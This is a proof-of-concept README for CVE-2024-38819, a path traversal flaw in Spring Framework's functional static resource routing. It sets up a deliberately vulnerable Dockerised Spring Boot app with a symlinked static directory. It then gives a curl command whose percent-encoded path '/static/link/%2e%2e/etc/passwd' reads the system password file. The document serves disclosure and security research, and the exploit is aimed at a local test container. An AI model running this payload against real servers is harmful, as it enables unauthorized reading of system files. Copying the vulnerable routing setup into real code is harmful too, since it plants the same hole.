# CVE-2024-38819: Proof of Concept (PoC)

This is a proof of concept for the [CVE-2024-38819](https://spring.io/security/cve-2024-38819) vulnerability, which I reported, demonstrating a path traversal exploit.

## Execution Steps
1. Build the Docker image (Spring Boot 3.3.4, based on Spring Framework 6.1.13)
   ```
   cd vuln
   docker build -t cve-2024-38819-poc .
   ```
2. Run the container and expose port 8080 to the host machine
   ```
   docker run -d -p 8080:8080 --name cve-2024-38819-poc cve-2024-38819-poc
   ```
3. Run the following command to execute the PoC and confirm the vulnerability
   ```
   curl http://localhost:8080/static/link/%2e%2e/etc/passwd
   ```

   If the attack is successful, the contents of the `/etc/passwd` file will be displayed.

## Explanation
1. Create `PathTraversalDemoApplication.java` with the following code to set up static file routing using `RouterFunction` and `FileSystemResource`:
    ```
    public RouterFunction<ServerResponse> staticResourceRouter() {
        return RouterFunctions.resources("/static/**", new FileSystemResource("/app/static/"));
    }
    ```

2. Add the following command to the Dockerfile to create a symbolic link:
    ```
    RUN ln -s /static /app/static/link
    ```

3. Create a payload that leverages percent-encoding to traverse directories through the symbolic link.
   - Path: `/static/link/%2e%2e/etc/passwd`

4. Use the following `curl` command to execute the PoC and verify if the attack is successful:
    ```
    curl http://localhost:8080/static/link/%2e%2e/etc/passwd
    ```
   If the attack is successful, the contents of the `/etc/passwd` file will be displayed.

## Disclaimer
This PoC is provided for educational and security research purposes. Before using this in a real system, ensure the vulnerability has been fixed and you have proper authorization. The author takes no responsibility for any misuse of this code.
